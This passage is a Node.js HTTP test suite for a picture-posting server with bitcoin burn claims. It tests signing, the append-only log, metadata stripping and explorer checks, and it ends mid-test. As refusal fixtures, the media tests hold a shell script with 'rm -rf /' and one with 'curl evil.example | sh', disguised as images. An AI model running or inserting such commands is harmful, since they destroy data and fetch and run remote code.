// The writer, driven over HTTP the way anything else would drive it.
//
// Every test here starts the real server on an ephemeral port and talks to it
// with fetch. Nothing reaches inside to call a handler directly, because the
// things most likely to be wrong — the status line, the refusal body, the header
// on a picture, the order two checks run in — are exactly the things a direct
// call skips.
//
// The three seams that touch the outside world are injected: the clock, the
// bitcoin explorers and the price sources. They are injected in a deployment
// too, so these are the real code paths with fakes on the far end rather than a
// test-only mode. A run needs no network and no ethers install.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { deflateSync } from 'node:zlib';
import { createHash } from 'node:crypto';
import { spawn } from 'node:child_process';

import { PARAMS } from '../core/params.mjs';
import { E, list as errorList } from '../core/errors.mjs';
import { actError, replay, MAX_COMMENT_CHARS } from '../core/replay.mjs';
import { MAX_DEPTH, canonicalJson, parseCanonical } from '../core/canonical.mjs';
import { formatEur } from '../core/pricing.mjs';
import { answerChallenge, challengeFor } from '../core/placement.mjs';

import { createServer, addressOf, signAct, signMessage, recoverAddressBuiltin, keccak256, personalHash, signingBytes } from '../server/index.mjs';
import { openLog } from '../server/log.mjs';
import { openStore, sniff, stripMetadata, dimensionsOf, cidOf } from '../server/media.mjs';
import { BURN_SCRIPT_HEX, checkBurn, mempoolSpace } from '../server/burnwatch.mjs';
import { decimalFrom, publicSources, readOracle, medianNano, eurToNano } from '../server/oracle.mjs';
import { buildChain } from '../server/chain/build.mjs';

// ── fixtures ───────────────────────────────────────────────────────────────

const CRC_TABLE = (() => {
  const table = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[n] = c;
  }
  return table;
})();

function crc32(buf) {
  let c = -1;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ -1) >>> 0;
}

function pngChunk(type, data) {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  const body = Buffer.concat([Buffer.from(type, 'latin1'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body));
  return Buffer.concat([len, body, crc]);
}

/** A real PNG: signature, IHDR, any extra chunks, IDAT, IEND. */
function makePng(w, h, extra = []) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;
  ihdr[9] = 2; // truecolour
  const stride = 1 + w * 3;
  const raw = Buffer.alloc(h * stride);
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      const o = y * stride + 1 + x * 3;
      raw[o] = (x * 7 + y * 13) & 255;
      raw[o + 1] = (x * 31) & 255;
      raw[o + 2] = (y * 17) & 255;
    }
  }
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    ...extra.map(([t, d]) => pngChunk(t, d)),
    pngChunk('IDAT', deflateSync(raw)),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A minimal but structurally real JPEG, optionally carrying an EXIF block. */
function makeJpeg(w, h, { exif = null } = {}) {
  const parts = [Buffer.from([0xff, 0xd8])];
  if (exif) {
    const payload = Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), Buffer.from(exif, 'latin1')]);
    const len = Buffer.alloc(2);
    len.writeUInt16BE(payload.length + 2);
    parts.push(Buffer.from([0xff, 0xe1]), len, payload);
  }
  const sof = Buffer.alloc(8);
  sof.writeUInt16BE(11, 0);
  sof[2] = 8;
  sof.writeUInt16BE(h, 3);
  sof.writeUInt16BE(w, 5);
  sof[7] = 1;
  parts.push(Buffer.from([0xff, 0xc0]), sof, Buffer.from([0x11, 0x00, 0x00]));
  parts.push(Buffer.from([0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00]));
  parts.push(Buffer.from([0x12, 0x34, 0x56, 0x78, 0x9a]));
  parts.push(Buffer.from([0xff, 0xd9]));
  return Buffer.concat(parts);
}

/** An explorer that answers from a table. Two of these, disagreeing, is the
 * whole of what BURN_EXPLORERS_DISAGREE is for. */
function fakeExplorer(name, table) {
  return {
    name,
    async tx(txid) {
      const row = table[txid];
      if (!row) throw new Error('404');
      return row;
    },
  };
}

const P2WPKH = '0014' + '11'.repeat(20);

function burnRow(sat, confirmations, scriptHex = BURN_SCRIPT_HEX) {
  return { confirmations, outputs: [{ sat: BigInt(sat), scriptHex }] };
}

function fakeSource(name, eurPerBtcNano) {
  return {
    name,
    async read() {
      if (eurPerBtcNano === null) throw new Error('down');
      return BigInt(eurPerBtcNano);
    },
  };
}

const PK = {
  alice: '0x' + '11'.repeat(32),
  bob: '0x' + '22'.repeat(32),
  carol: '0x' + '33'.repeat(32),
  dave: '0x' + '44'.repeat(32),
};
const ADDR = Object.fromEntries(Object.entries(PK).map(([k, v]) => [k, addressOf(v)]));

// ── harness ────────────────────────────────────────────────────────────────

function http(url) {
  return {
    url,
    async get(path) {
      const res = await fetch(url + path);
      const text = await res.text();
      let body;
      try {
        body = JSON.parse(text);
      } catch {
        body = { raw: text };
      }
      return { status: res.status, headers: res.headers, body };
    },
    async raw(path) {
      const res = await fetch(url + path);
      return { status: res.status, headers: res.headers, bytes: Buffer.from(await res.arrayBuffer()) };
    },
    async send(signed) {
      const res = await fetch(url + '/api/v1/act', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(signed),
      });
      return { status: res.status, body: await res.json(), signed };
    },
    async act(body, pk) {
      return this.send(signAct(body, pk));
    },
    async upload(bytes, { cid = null, type = 'application/octet-stream' } = {}) {
      const res = await fetch(url + '/api/v1/media' + (cid ? `?cid=${cid}` : ''), {
        method: 'POST',
        headers: { 'content-type': type },
        body: bytes,
      });
      return { status: res.status, body: await res.json() };
    },
  };
}

/**
 * A server with a fake clock, fake explorers and fake price sources, plus two
 * registered accounts, reserve, PTP and CAP. Everything else is built on top of
 * this so that no test spends its own lines getting to the interesting part.
 */
async function bootstrap(t, options = {}) {
  const { startAt = Date.parse('2026-08-12T09:00:00.000Z'), ...serverOptions } = options;
  const dir = await mkdtemp(join(tmpdir(), 'ptp-server-'));
  const clock = { t: startAt };

  const burns = {
    ['a'.repeat(64)]: burnRow(500000, 6),
    ['b'.repeat(64)]: burnRow(500000, 6),
    ['c'.repeat(64)]: burnRow(500000, 1), // confirmed too shallow
    ['d'.repeat(64)]: burnRow(500000, 6, P2WPKH), // a transfer, not a burn
  };
  const explorers = [fakeExplorer('one', burns), fakeExplorer('two', burns)];
  const oracleSources = [90000, 90010, 89990, 90005, 89995].map((v, i) =>
    fakeSource(`src${i}`, BigInt(v) * 1000000000n),
  );

  const srv = await createServer({
    dir,
    now: () => clock.t,
    explorers,
    oracleSources,
    ...serverOptions,
  });
  const { url } = await srv.listen(0);
  const api = http(url);

  t.after(async () => {
    await srv.close();
    await rm(dir, { recursive: true, force: true });
  });

  const ctx = { dir, clock, srv, api, url, burns, explorers, oracleSources };

  // Two accounts with money, which is four acts each and nothing surprising.
  await api.act({ t: clock.t, as: ADDR.alice, k: 'register', handle: 'alice' }, PK.alice);
  await api.act({ t: clock.t, as: ADDR.bob, k: 'register', handle: 'bob' }, PK.bob);
  await api.act({ t: clock.t, as: ADDR.alice, k: 'burnClaim', txid: 'a'.repeat(64), vout: 0, sat: '500000' }, PK.alice);
  await api.act({ t: clock.t, as: ADDR.bob, k: 'burnClaim', txid: 'b'.repeat(64), vout: 0, sat: '500000' }, PK.bob);
  await api.act({ t: clock.t, as: ADDR.alice, k: 'swap', sell: 'btc', amt: '200000', minOut: '1' }, PK.alice);
  await api.act({ t: clock.t, as: ADDR.bob, k: 'swap', sell: 'btc', amt: '200000', minOut: '1' }, PK.bob);
  await api.act({ t: clock.t, as: ADDR.alice, k: 'capBuy', ptp: '10000000000000000' }, PK.alice);

  return ctx;
}

/** Upload a picture and publish it. Returns { pid, cid, bytes, post }. */
async function publish(ctx, { w = 320, h = 240, days = 1, priceNano = '100000' } = {}) {
  const png = makePng(w, h);
  const up = await ctx.api.upload(png, { type: 'image/png' });
  assert.equal(up.status, 200, JSON.stringify(up.body));
  const posted = await ctx.api.act(
    {
      t: ctx.clock.t,
      as: ADDR.alice,
      k: 'post',
      cid: up.body.cid,
      bytes: up.body.bytes,
      mime: up.body.mime,
      w: up.body.w,
      h: up.body.h,
      viewPriceNano: priceNano,
      days,
    },
    PK.alice,
  );
  assert.equal(posted.status, 200, JSON.stringify(posted.body));
  return { pid: posted.body.post.pid, cid: up.body.cid, bytes: png, post: posted.body.post };
}

/** The economic content of a world, canonically encoded, for comparing a live
 * world against one replayed from the file the server actually wrote. */
function projection(w) {
  return canonicalJson({
    accounts: w.accounts,
    posts: w.posts,
    comments: w.comments,
    pool: w.pool,
    supply: w.supply,
    treasury: w.treasury,
    capacity: w.capacity,
    rules: w.rules,
    seq: w.seq,
    epoch: { n: w.epoch.n, burnedWei: w.epoch.burnedWei, startedAt: w.epoch.startedAt },
    log: { count: w.log.count, lastIndex: w.log.lastIndex, skipped: w.log.skipped },
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// the primitives the whole thing rests on
// ═══════════════════════════════════════════════════════════════════════════

test('keccak256 and address derivation match published vectors', () => {
  assert.equal(
    keccak256(Buffer.alloc(0)).toString('hex'),
    'c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470',
  );
  assert.equal(
    keccak256(Buffer.from('abc')).toString('hex'),
    '4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45',
  );
  // The two smallest private keys, whose addresses are published everywhere.
  assert.equal(addressOf('0x' + '00'.repeat(31) + '01'), '0x7e5f4552091a69125d5dfcb7b8c2659029395bdf');
  assert.equal(addressOf('0x' + '00'.repeat(31) + '02'), '0x2b5ad5c4795c026514f8317c7a215e218dccd6cf');
});

test('a signature round-trips, and one flipped bit does not', () => {
  const msg = Buffer.from('peer two peer');
  const sig = signMessage(msg, PK.alice);
  assert.equal(recoverAddressBuiltin(msg, sig), ADDR.alice);
  assert.notEqual(recoverAddressBuiltin(Buffer.from('peer two peeR'), sig), ADDR.alice);
  // Garbage never throws; it recovers to nothing, which is a refusal and not a
  // crash. A verifier that throws on hostile input is a denial of service.
  assert.equal(recoverAddressBuiltin(msg, '0xdeadbeef'), null);
  assert.equal(recoverAddressBuiltin(msg, 'not a signature'), null);
  assert.equal(personalHash(msg).length, 32);
});

test('what is signed is the canonical body without sig and without i', () => {
  const body = { t: 1, as: ADDR.alice, k: 'like', pid: 'p1' };
  const a = signingBytes({ ...body, sig: '0xdead', i: 7 }).toString('utf8');
  const b = signingBytes(body).toString('utf8');
  assert.equal(a, b);
  // Key order is not something two implementations get to disagree about.
  const reordered = signingBytes({ pid: 'p1', k: 'like', as: ADDR.alice, t: 1 }).toString('utf8');
  assert.equal(reordered, b);
});

// ═══════════════════════════════════════════════════════════════════════════
// the log
// ═══════════════════════════════════════════════════════════════════════════

test('the log is append-only across a restart, and indices are dense', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-log-'));
  t.after(() => rm(dir, { recursive: true, force: true }));

  let log = await openLog({ dir });
  await log.append({ t: 1, as: ADDR.alice, k: 'register', handle: 'alice' });
  await log.append({ t: 2, as: ADDR.bob, k: 'register', handle: 'bob' });
  const firstBytes = await readFile(log.path);
  await log.close();

  log = await openLog({ dir });
  assert.equal(log.count, 2);
  assert.equal(log.acts[0].i, 0);
  assert.equal(log.acts[1].i, 1);
  assert.equal(log.nextIndex, 2);
  await log.append({ t: 3, as: ADDR.carol, k: 'register', handle: 'carol' });
  const secondBytes = await readFile(log.path);
  await log.close();

  // Byte-prefix identity: the file grew and nothing that was already there
  // moved. A rewritten line is a rewritten history.
  assert.ok(secondBytes.subarray(0, firstBytes.length).equals(firstBytes));
  assert.equal(secondBytes.toString('utf8').trimEnd().split('\n').length, 3);
});

test('a crash mid-write leaves a partial line, which is truncated and reported', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-log-'));
  t.after(() => rm(dir, { recursive: true, force: true }));

  let log = await openLog({ dir });
  await log.append({ t: 1, as: ADDR.alice, k: 'register', handle: 'alice' });
  const path = log.path;
  await log.close();

  const whole = await readFile(path);
  await writeFile(path, Buffer.concat([whole, Buffer.from('{"t":2,"as":"0xdead', 'utf8')]));

  log = await openLog({ dir });
  assert.equal(log.count, 1, 'the complete line survives');
  assert.equal(log.truncatedBytes, 19, 'and the incomplete one is reported, not hidden');
  const after = await readFile(path);
  assert.ok(after.equals(whole));
  await log.close();
});

test('redaction refuses any field the rulebook reads, and is byte-length neutral otherwise', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-log-'));
  t.after(() => rm(dir, { recursive: true, force: true }));

  const log = await openLog({ dir });
  await log.append({ t: 1, as: ADDR.alice, k: 'post', cid: 'a'.repeat(64), bytes: 10, mime: 'image/png', w: 1, h: 1, viewPriceNano: '100000', days: 1 });
  await log.append({ t: 2, as: ADDR.bob, k: 'register', handle: 'bob', note: 'a payload the rulebook does not read' });
  const before = await readFile(log.path);

  // The cid is what §6 calls payload — and core/replay.mjs reads it, so removing
  // it would not redact the world, it would replace it with a different one.
  await assert.rejects(() => log.redact(0, ['cid']), (err) => err.message === 'REDACT_UNSAFE' && err.detail.field === 'cid');

  const result = await log.redact(1, ['note']);
  assert.equal(result.touched, 1);
  const after = await readFile(log.path);
  assert.equal(after.length, before.length, 'every other offset in the file is untouched');
  assert.ok(after.subarray(0, before.indexOf(0x0a) + 1).equals(before.subarray(0, before.indexOf(0x0a) + 1)));
  assert.equal(log.acts[1].note, null);
  assert.equal(log.acts[1].handle, 'bob', 'the structure survives the payload');

  // And a fresh reader parses the padded line without knowing anything about
  // redaction.
  await log.close();
  const reopened = await openLog({ dir });
  assert.equal(reopened.count, 2);
  assert.equal(reopened.acts[1].note, null);
  assert.equal(reopened.acts[1].handle, 'bob');
  await reopened.close();
});

test('redaction pads in bytes, so multi-byte text cannot overrun the next act', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-log-'));
  t.after(() => rm(dir, { recursive: true, force: true }));

  // A span is measured in BYTES and `padEnd` counts UTF-16 CODE UNITS, and the
  // two are different numbers for every character outside ASCII: an emoji is two
  // units and four bytes, a CJK character is one unit and three, a combining
  // accent is one unit and two. Padding a redacted line to the span's length in
  // units therefore wrote MORE bytes than the line it replaced and ran over the
  // act on the next line — measured at 194 bytes in and 216 bytes out, with the
  // following act destroyed mid-token and the reopened log reporting one
  // unreadable line where there had been two good ones.
  //
  // The multi-byte text lives in a field the redaction does NOT name, because
  // that is the case that bites: what matters is what the rewritten line still
  // carries, not what was taken out of it. Several lengths, at every ratio the
  // encoding has, so a fix that happens to work at one width is not enough.
  const payloads = [
    '🐈‍⬛',
    '東京',
    'é',
    '🐈‍⬛ 東京 café é',
    '🇪🇺'.repeat(7) + '漢字仮名'.repeat(11) + 'é'.repeat(23),
  ];

  const log = await openLog({ dir });
  for (const bio of payloads) {
    await log.append({ t: 1, as: ADDR.alice, k: 'register', handle: 'alice', bio, note: 'a payload the rulebook does not read' });
    await log.append({ t: 2, as: ADDR.bob, k: 'register', handle: 'bob' });
  }
  const before = await readFile(log.path);
  const wasLines = before.toString('utf8').split('\n').slice(0, -1);

  for (let n = 0; n < payloads.length; n++) {
    const result = await log.redact(n * 2, ['note']);
    assert.equal(result.touched, 1);
    // What is handed back is what is on the disk, so its byte length is the
    // span's byte length exactly — not one byte more and not one byte fewer.
    assert.equal(
      Buffer.byteLength(result.line, 'utf8'),
      Buffer.byteLength(wasLines[n * 2], 'utf8'),
      `payload ${n} did not write its span exactly`,
    );
  }

  const after = await readFile(log.path);
  assert.equal(after.length, before.length, 'the file did not grow by a byte');
  const nowLines = after.toString('utf8').split('\n').slice(0, -1);
  assert.equal(nowLines.length, wasLines.length, 'and no newline was written over');
  for (let i = 0; i < nowLines.length; i++) {
    assert.equal(
      Buffer.byteLength(nowLines[i], 'utf8'),
      Buffer.byteLength(wasLines[i], 'utf8'),
      `line ${i} changed byte length`,
    );
  }

  for (let n = 0; n < payloads.length; n++) {
    const redacted = JSON.parse(nowLines[n * 2]);
    assert.equal(redacted.note, null, 'the payload is gone');
    assert.equal(redacted.bio, payloads[n], 'the multi-byte text nobody named survives');
    const next = JSON.parse(nowLines[n * 2 + 1]);
    assert.equal(next.handle, 'bob', 'and the act on the NEXT line still parses');
    assert.equal(next.i, n * 2 + 1, 'intact, and still where it was');
  }

  await log.close();
  const reopened = await openLog({ dir });
  assert.deepEqual(reopened.unreadable, [], 'a fresh reader finds nothing broken');
  assert.equal(reopened.count, payloads.length * 2);
  for (let n = 0; n < payloads.length; n++) {
    assert.equal(reopened.acts[n * 2].note, null);
    assert.equal(reopened.acts[n * 2].bio, payloads[n]);
    assert.equal(reopened.acts[n * 2 + 1].handle, 'bob');
  }
  await reopened.close();
});

// ═══════════════════════════════════════════════════════════════════════════
// media
// ═══════════════════════════════════════════════════════════════════════════

test('the type is read from the leading bytes, never from a name or a header', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-media-'));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const store = await openStore({ dir });

  assert.equal(sniff(makePng(4, 4)), 'image/png');
  assert.equal(sniff(makeJpeg(4, 4)), 'image/jpeg');
  assert.equal(sniff(Buffer.from('GIF89a' + 'x'.repeat(20))), null);
  assert.equal(sniff(Buffer.from('#!/bin/sh\nrm -rf /\n')), null);

  await assert.rejects(
    () => store.put(Buffer.from('#!/bin/sh\nrm -rf / # named holiday.jpg\n')),
    (err) => err.code === 'MIME_REFUSED',
  );
});

test('EXIF is stripped before the cid is computed, so the cid addresses what is served', async (t) => {
  const dir = await mkdtemp(join(tmpdir(), 'ptp-media-'));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const store = await openStore({ dir });

  const secret = 'GPS 51.5074N 0.1278W  camera serial 0xC0FFEE';
  const withExif = makeJpeg(64, 48, { exif: secret });
  assert.ok(withExif.includes(secret), 'the fixture really carries it');

  const stored = await store.put(withExif);
  const served = await store.get(stored.cid);
  assert.ok(!served.bytes.includes(secret), 'and the stored bytes really do not');
  assert.equal(stored.cid, cidOf(served.bytes), 'the cid is the sha256 of what is served');
  assert.notEqual(stored.cid, cidOf(withExif), 'which is not the sha256 of what was uploaded');
  assert.equal(stored.w, 64);
  assert.equal(stored.h, 48);
  assert.equal(dimensionsOf(served.bytes, 'image/jpeg').h, 48);

  // A PNG with a text chunk loses the chunk; one without is byte-identical, so
  // a client that already strips computes the same cid.
  const clean = makePng(8, 8);
  assert.ok(stripMetadata(clean, 'image/png').equals(clean));
  const chatty = makePng(8, 8, [['tEXt', Buffer.from('Author\0Somebody Real', 'latin1')]]);
  assert.ok(!stripMetadata(chatty, 'image/png').includes('Somebody Real'));

  // A container that does not parse to the end is refused rather than half
  // stripped. Sniffing says "this begins like a PNG"; parsing says "and this
  // host can account for every byte of it", and only the second is a basis for
  // promising that the metadata is gone.
  const truncated = clean.subarray(0, clean.length - 20);
  assert.equal(stripMetadata(truncated, 'image/png'), null);
  await assert.rejects(() => store.put(truncated), (err) => err.code === 'MIME_REFUSED');

  const liar = Buffer.concat([
    makePng(8, 8, [['eXIf', Buffer.from('here is my home address', 'latin1')]]).subarray(0, 60),
    Buffer.from('\xff\xff\xff\xffJUNK', 'latin1'),
  ]);
  assert.equal(sniff(liar), 'image/png', 'it begins like a PNG');
  await assert.rejects(() => store.put(liar), (err) => err.code === 'MIME_REFUSED');

  const halfJpeg = withExif.subarray(0, 20);
  assert.equal(stripMetadata(halfJpeg, 'image/jpeg'), null, 'a JPEG with no scan is not a picture');
});

test('a picture whose bytes do not hash to its declared cid is refused', async (t) => {
  const ctx = await bootstrap(t);
  const png = makePng(16, 16);

  const wrong = await ctx.api.upload(png, { cid: '0'.repeat(64), type: 'image/png' });
  assert.equal(wrong.status, E.CID_MISMATCH.http);
  assert.equal(wrong.body.code, 'CID_MISMATCH');
  assert.equal(wrong.body.detail.actual, cidOf(png));
  // All four fields, always.
  for (const field of ['code', 'msg', 'why', 'next']) assert.ok(wrong.body[field], `missing ${field}`);

  const right = await ctx.api.upload(png, { cid: cidOf(png), type: 'image/png' });
  assert.equal(right.status, 200);
  assert.equal(right.body.cid, cidOf(png));
});

test('a shell script called holiday.jpg is refused by this host', async (t) => {
  const ctx = await bootstrap(t);
  const script = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n# padding to look like a file\n');

  const res = await ctx.api.upload(script, { type: 'image/jpeg' });
  assert.equal(res.status, E.MIME_REFUSED.http);
  assert.equal(res.body.code, 'MIME_REFUSED');

  // And a post naming a cid nobody uploaded is refused too, so the declared type
  // cannot get in through the act instead.
  const act = await ctx.api.act(
    {
      t: ctx.clock.t,
      as: ADDR.alice,
      k: 'post',
      cid: cidOf(script),
      bytes: script.length,
      mime: 'image/jpeg',
      w: 100,
      h: 100,
      viewPriceNano: '100000',
      days: 1,
    },
    PK.alice,
  );
  assert.equal(act.body.code, 'CID_MISMATCH');
  assert.equal(act.body.detail.stored, false);
});

test('a picture is served under an immutable header keyed on its cid', async (t) => {
  const ctx = await bootstrap(t);
  const { cid, bytes } = await publish(ctx);

  const got = await ctx.api.raw(`/media/${cid}`);
  assert.equal(got.status, 200);
  assert.ok(got.bytes.equals(bytes));
  assert.equal(got.headers.get('etag'), `"${cid}"`);
  assert.match(got.headers.get('cache-control'), /immutable/);
  assert.equal(got.headers.get('content-type'), 'image/png');
  assert.equal(got.headers.get('x-content-type-options'), 'nosniff');

  const missing = await ctx.api.get('/media/' + '0'.repeat(64));
  assert.equal(missing.status, 404);
  assert.equal(missing.body.code, 'NOT_FOUND');
});

// ═══════════════════════════════════════════════════════════════════════════
// proof of burn
// ═══════════════════════════════════════════════════════════════════════════

test('the burn output is a p2wsh of a bare OP_RETURN, derived and not pasted', () => {
  const expected = '0020' + createHash('sha256').update(Buffer.from([0x6a])).digest('hex');
  assert.equal(BURN_SCRIPT_HEX, expected);
  assert.equal(BURN_SCRIPT_HEX.length, 68);
});

test('two explorers must agree, and every way they can disagree is refused', async () => {
  const good = { ['a'.repeat(64)]: burnRow(500000, 6) };
  const two = [fakeExplorer('one', good), fakeExplorer('two', good)];
  const claim = { txid: 'a'.repeat(64), vout: 0, sat: 500000n };

  const ok = await checkBurn(claim, { explorers: two });
  assert.equal(ok.sat, 500000n);
  assert.equal(ok.confirmations, 6);
  assert.deepEqual(ok.explorers, ['one', 'two']);

  // One explorer is not enough. There is nobody to disagree with, which is the
  // same problem wearing a friendlier face.
  await assert.rejects(
    () => checkBurn(claim, { explorers: [two[0]] }),
    (err) => err.code === 'BURN_EXPLORERS_DISAGREE' && err.detail.configured === 1,
  );

  // A different amount.
  await assert.rejects(
    () => checkBurn(claim, { explorers: [two[0], fakeExplorer('two', { ['a'.repeat(64)]: burnRow(400000, 6) })] }),
    (err) => err.code === 'BURN_EXPLORERS_DISAGREE' && err.detail.views.length === 2,
  );

  // A different script.
  await assert.rejects(
    () => checkBurn(claim, { explorers: [two[0], fakeExplorer('two', { ['a'.repeat(64)]: burnRow(500000, 6, P2WPKH) })] }),
    (err) => err.code === 'BURN_EXPLORERS_DISAGREE',
  );

  // Depths further apart than propagation explains.
  await assert.rejects(
    () => checkBurn(claim, { explorers: [two[0], fakeExplorer('two', { ['a'.repeat(64)]: burnRow(500000, 99) })] }),
    (err) => err.code === 'BURN_EXPLORERS_DISAGREE' && Array.isArray(err.detail.confirmations),
  );

  // One that answers and one that does not.
  await assert.rejects(
    () => checkBurn(claim, { explorers: [two[0], fakeExplorer('two', {})] }),
    (err) => err.code === 'BURN_EXPLORERS_DISAGREE' && err.detail.answered === 1,
  );

  // Agreeing about a transfer is not agreeing about a burn.
  const spendable = { ['a'.repeat(64)]: burnRow(500000, 6, P2WPKH) };
  await assert.rejects(
    () => checkBurn(claim, { explorers: [fakeExplorer('one', spendable), fakeExplorer('two', spendable)] }),
    (err) => err.code === 'BURN_NOT_KEYLESS' && err.detail.script === P2WPKH,
  );

  // Agreeing and too shallow.
  const shallow = { ['a'.repeat(64)]: burnRow(500000, 1) };
  await assert.rejects(
    () => checkBurn(claim, { explorers: [fakeExplorer('one', shallow), fakeExplorer('two', shallow)] }),
    (err) => err.code === 'BURN_UNCONFIRMED' && err.detail.confirmations === 1,
  );

  // A claim for more than was destroyed.
  await assert.rejects(
    () => checkBurn({ ...claim, sat: 600000n }, { explorers: two }),
    (err) => err.code === 'BAD_AMOUNT' && err.detail.observed === '500000',
  );

  // And the cheap check first: a txid already in the log never reaches a network.
  let asked = 0;
  const counting = two.map((e) => ({ name: e.name, tx: async (id) => { asked += 1; return e.tx(id); } }));
  await assert.rejects(
    () => checkBurn(claim, { explorers: counting, claimed: () => true }),
    (err) => err.code === 'BURN_ALREADY_CLAIMED',
  );
  assert.equal(asked, 0);
});

test('a burnClaim the explorers refuse never reaches the log', async (t) => {
  const ctx = await bootstrap(t);
  const before = ctx.srv.log.count;

  const shallow = await ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'burnClaim', txid: 'c'.repeat(64), vout: 0, sat: '500000' }, PK.alice);
  assert.equal(shallow.body.code, 'BURN_UNCONFIRMED');
  assert.equal(shallow.status, E.BURN_UNCONFIRMED.http);

  const transfer = await ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'burnClaim', txid: 'd'.repeat(64), vout: 0, sat: '500000' }, PK.alice);
  assert.equal(transfer.body.code, 'BURN_NOT_KEYLESS');

  const again = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'burnClaim', txid: 'a'.repeat(64), vout: 0, sat: '500000' }, PK.bob);
  assert.equal(again.body.code, 'BURN_ALREADY_CLAIMED');

  assert.equal(ctx.srv.log.count, before, 'nothing was written');
});

test('an explorer answer is bounded in time and in bytes', async () => {
  const txid = 'a'.repeat(64);
  const base = 'https://explorer.example/api';

  // A fetch that never answers on its own. It settles only because the abort
  // signal fires, and that is the assertion: the deadline has to be on the
  // REQUEST. A promise merely racing beside the request leaves the socket open
  // and the read running after the caller has given up, which is a leak wearing
  // a timeout's clothes.
  const stalling = (url, options) =>
    new Promise((_, reject) => {
      // A ref'd timer for the duration, because `AbortSignal.timeout` uses an
      // UNREF'D one. In a deployment the open socket keeps the loop alive and
      // the deadline fires against real work; here there is no socket, so
      // without this the loop would drain before the abort ever landed.
      const alive = setInterval(() => {}, 1000);
      options.signal.addEventListener('abort', () => {
        clearInterval(alive);
        reject(options.signal.reason || new Error('aborted'));
      });
    });
  await assert.rejects(
    () => mempoolSpace(stalling, base, { timeoutMs: 50 }).tx(txid),
    (err) => err instanceof Error,
  );

  // A length that already exceeds the cap is refused before a byte of body is
  // read, so a hostile answer costs one set of headers.
  const declared = async () => ({
    ok: true,
    status: 200,
    headers: new Headers({ 'content-length': '99999999' }),
    body: null,
    async text() {
      throw new Error('the body must not be read');
    },
  });
  await assert.rejects(
    () => mempoolSpace(declared, base, { maxBytes: 8192 }).tx(txid),
    (err) => err.code === 'PAYLOAD_TOO_LARGE' && err.detail.bytes === 99999999,
  );

  // A body that never ends, and no length to warn about it. It is dropped as it
  // arrives rather than after it has all been held, so the cap bounds this
  // host's memory and not merely what it goes on to use.
  let chunks = 0;
  const endless = async () => ({
    ok: true,
    status: 200,
    headers: new Headers(),
    body: new ReadableStream({
      pull(controller) {
        chunks += 1;
        controller.enqueue(new Uint8Array(4096));
      },
    }),
  });
  await assert.rejects(
    () => mempoolSpace(endless, base, { maxBytes: 8192 }).tx(txid),
    (err) => err.code === 'PAYLOAD_TOO_LARGE' && err.detail.max === 8192,
  );
  assert.ok(chunks < 64, `the stream was cancelled early, not drained (${chunks} chunks)`);

  // And an ordinary answer still normalises, which is what the bounds are there
  // to protect rather than replace.
  const good = async (url) =>
    new Response(
      url.endsWith('/blocks/tip/height')
        ? '900006'
        : JSON.stringify({
            status: { confirmed: true, block_height: 900000 },
            vout: [{ value: 500000, scriptpubkey: BURN_SCRIPT_HEX }],
          }),
      { status: 200 },
    );
  const seen = await mempoolSpace(good, base).tx(txid);
  assert.equal(seen.confirmations, 7);
  assert.equal(seen.outputs[0].sat, 500000n);
  assert.equal(seen.outputs[0].scriptHex, BURN_SCRIPT_HEX);
});

test('a stalled explorer holds up its own claim and nothing else', async (t) => {
  // The explorers are asked over the network, and that call used to be awaited
  // with the write queue HELD — so two explorers that never answered stopped
  // every write on this host, not merely the claim that was waiting for them.
  const table = {
    ['a'.repeat(64)]: burnRow(500000, 6),
    ['b'.repeat(64)]: burnRow(500000, 6),
    ['e'.repeat(64)]: burnRow(500000, 6),
  };
  const explorers = [fakeExplorer('one', table), fakeExplorer('two', table)];
  const ctx = await bootstrap(t, { explorers });

  let asked = 0;
  let release = () => {};
  const gate = new Promise((r) => {
    release = r;
  });
  // The same array the writer closed over, so from here on it is talking to two
  // explorers that will not answer until this test lets them.
  const stalled = (name) => ({
    name,
    async tx(txid) {
      asked += 1;
      await gate;
      return table[txid];
    },
  });
  explorers.splice(0, explorers.length, stalled('one'), stalled('two'));

  const stuck = ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'burnClaim', txid: 'e'.repeat(64), vout: 0, sat: '500000' }, PK.bob);
  try {
    // Wait until the claim is really sitting on the explorers, so the writes
    // below are genuinely behind a call that is in flight rather than merely
    // sent afterwards.
    const until = Date.now() + 5000;
